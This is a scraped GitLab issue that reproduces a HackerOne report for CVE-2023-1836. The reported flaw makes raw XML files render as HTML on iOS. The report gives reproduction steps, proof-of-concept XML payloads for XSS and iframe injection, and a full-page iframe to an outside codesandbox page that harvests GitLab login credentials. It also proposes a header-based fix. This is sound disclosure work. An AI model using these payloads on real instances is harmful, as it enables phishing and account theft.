=== Content from gitlab.com_cc3fc89c_20250114_221611.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-1836.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-1836.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-1836.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-1836.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ðŸ¤– GitLab Bot ðŸ¤–'s avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ðŸ¤– GitLab Bot ðŸ¤–")](/gitlab-bot)

  May 03, 2023

  [48000e9f](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  Â·
  48000e9f

  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored May 03, 2023

  48000e9f

  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored May 03, 2023

Loading



=== Content from gitlab.com_2b91892d_20250114_221612.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# XSS and content injection and iframe injection when viewing raw files on IOS devices

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #1923293](https://hackerone.com/reports/1923293)** by `joaxcar` on 2023-03-29, assigned to [@ameyadarshan](/ameyadarshan "Ameya Darshan"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

When viewing an XML file in a repository in "raw" mode, it can be made to render as HTML if viewed on an IOS device. On a self-hosted GitLab instance without proper CSP this will lead to full XSS on the instance. On gitlab.com CSP will block JavaScript execution (I have not found a bypass for this yet) but it will allow for HTML injection that can be used for open redirection or phishing (as I will show in the POC)

I want to note that this issue stems from what I believe is a bug in WebKit (thus affecting all IOS browsers) and I have reported this to them. I don't know if they will decide on fixing this (might be spec related) and how long this will take. Also, users will be at risk until an eventual patch and after a patch until updating their IOS devices. And as there is an easy mitigation you can apply in the meantime, I think it might be worth considering.

When viewing an XML file as "raw" in GitLab it is loaded with the headers

```
Content-Type: plain/text
Content-Disposition: inline
```

IOS browsers will ignore the content-type header if there is a content type defined in the actual XML file (this is according to some old spec). Rendering this XML `inline` will make the browsers display HTML

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://www.w3.org/1999/xhtml">
<html:script>alert(document.domain);</html:script>
<html:iframe src="https://example.com"></html:iframe>
</html>
```

##### Workaround (mitigation)

To get around this issue, you can do as you do with "raw" SVG files and serve them with

```
Content-Disposition: attachment
```

This will force the browsers on IOS to download the files instead of displaying them inline. This should be an easy fix with minor implications for the user. If a fix is put in place in WebKit, you could later revert this.

#### Steps to reproduce

##### XSS (self-hosted)

Make sure you can access your self-hosted server on an IOS device. I used NGROK for this.

1. Log in to your GitLab instance as the attacker
2. Create a new public project (<https://gitlab.example.com/projects/new>)
3. Create a new file in the project (<https://gitlab.example.com/groupname/projectname/-/new/main/>)
4. Name the file `xss.xml` and add the content

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://www.w3.org/1999/xhtml">
<html:script>alert(document.domain);</html:script>
</html>
```

5. Save the file
6. Now access the file as `raw` on your IOS device by visiting

   <https://gitlab.example.com/groupname/projectname/-/raw/main/xss.xml>
7. There should be a popup from gitlab.example.com

##### Iframe injection on Gitlab.com

Gitlab.com has a CSP that blocks most attacks. But there is one escape hatch in the frame-src directive, where we are allowed to frame any subdomain of `*.codesandbox.io`. This allows the attacker to create his/her own content on codesandbox and frame it inside gitlab.com. I have created two codesandbox projects that you can use to test with (if not creating your own).

1. Log in to <https://gitlab.com> as the attacker
2. Create a new public project (<https://gitlab.com/projects/new>)
3. Create a new file in the project (<https://gitlab.com/groupname/projectname/-/new/main/>)
4. Name the file `frame_redirect.xml` and add the content

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://www.w3.org/1999/xhtml">
<html:iframe src="https://navigate-top-rr5r5j.codesandbox.io"></html:iframe>
</html>
```

5. Save the file
6. Create a second file in the same project
7. Name the file `frame_login.xml` and add the content

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://www.w3.org/1999/xhtml">
<html:iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" src="https://withered-http-cxcy0d.codesandbox.io"></html:iframe>
</html>
```

8. Save the file
9. Now access these files as `raw` on your IOS device by visiting

   <https://gitlab.com/groupname/projectname/-/raw/main/iframe_redirect.xml>
10. You should be redirected to <https://example.com>
11. Visit <https://gitlab.example.com/groupname/projectname/-/raw/main/iframe_login.xml>
12. You should be presented with the GitLab login screen, if entering creds here they will be sent to my codesandbox (this is a full page iframe shown)

This is an image how it looks on my phone (note the real gitlab.com domain, and that this is my XML file not the real login screen)

[![IMG_0978.PNG](data:image/gif;base64...)](https://user-content.gitlab-static.net/4ea5be17f1297fcf59a88d4c987c27a1e020ebb3/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35383364336562622d356232632d343336362d396362322d3762306666393766656131662f494d475f303937382e504e47)

#### Impact

Full XSS on self-hosted instances. Open redirect and arbitrary content on gitlab.com

#### What is the current *bug* behavior?

GitLab serves XML files as inline content when viewed as `raw` files. This will render HTML on IOS devices

#### What is the expected *correct* behavior?

GitLab should serve XML as `attachment` just like with SVGs to prevent this

#### Impact

Full XSS on self-hosted instances. Open redirect and arbitrary content on gitlab.com

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [IMG\_0978.PNG](https://h1.sec.gitlab.net/a/583d3ebb-5b2c-4366-9cb2-7b0ff97fea1f/IMG_0978.PNG)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


